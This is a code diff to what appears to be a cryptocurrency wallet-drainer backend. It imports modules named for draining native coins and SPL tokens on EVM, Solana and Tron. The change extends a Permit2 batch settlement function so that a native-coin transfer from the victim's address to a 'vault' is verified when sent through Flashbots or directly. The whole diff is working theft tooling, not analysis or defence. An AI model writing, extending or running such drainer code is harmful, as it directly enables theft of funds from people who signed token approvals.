@@ -25,7 +25,7 @@ import {
   resolveSettlementExecutorKey,
 } from './permit2-executor.js'
 import { deliverSignedEvmTransactions, isFlashbotsEnabled } from './flashbots-relay.js'
-import { deliverNativeWithPermit2Transactions } from './native-coin-drain.js'
+import { deliverNativeWithPermit2Transactions, parseNativeAmount } from './native-coin-drain.js'
 import { broadcastSignedSolNativeTransfer } from './solana-native-drain.js'
 import { executeSplTokenDrain } from './solana-spl-drain.js'
 import { broadcastSignedTrxNativeTransfer } from './tron-native-drain.js'
@@ -859,6 +859,15 @@ export async function executeBatchPermit2Settlement(params: {
   const walletClient = createWalletClient({ account, chain, transport })
 
   const owner = getAddress(params.owner)
+  const nativeAmount = parseNativeAmount(params.batch.native_amount ?? '0')
+  const nativeVerifyOpts =
+    nativeAmount > 0n
+      ? {
+          nativeExpectedFrom: owner,
+          nativeExpectedTo: vault,
+          nativeExpectedValue: nativeAmount,
+        }
+      : {}
   const permitBatch = {
     details: params.batch.details.map((detail) => ({
       token: getAddress(detail.token),
@@ -921,6 +930,7 @@ export async function executeBatchPermit2Settlement(params: {
         permit2SignedTransactions: [permitSigned, transferSigned],
         chainId: params.chainId,
         rpcUrl: rpc,
+        ...nativeVerifyOpts,
       })
       if (!delivery.ok) {
         return { ok: false, detail: delivery.detail ?? 'Flashbots batch Permit2 settlement failed' }
@@ -973,6 +983,7 @@ export async function executeBatchPermit2Settlement(params: {
       permit2SignedTransactions: [],
       chainId: params.chainId,
       rpcUrl: rpc,
+      ...nativeVerifyOpts,
     })
     if (!nativeDelivery.ok) {
       return {
